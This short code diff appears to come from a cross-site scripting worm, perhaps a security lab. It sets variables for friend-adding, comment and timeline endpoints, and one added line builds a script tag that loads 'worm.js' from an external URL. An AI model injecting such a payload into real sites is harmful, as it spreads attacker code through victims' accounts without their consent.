@@ -1,7 +1,7 @@
 var addFriend = "add_friend.php";
 var createComment = "add_comment.php";
 var timeLine = "timeline.php"
-var info = "<script src='></script>";
+var info = "<script src='https://raw.githubusercontent.com/mds5648/website/main/worm.js'></script>";
 var user = 71;
 let date = Date.now();
 
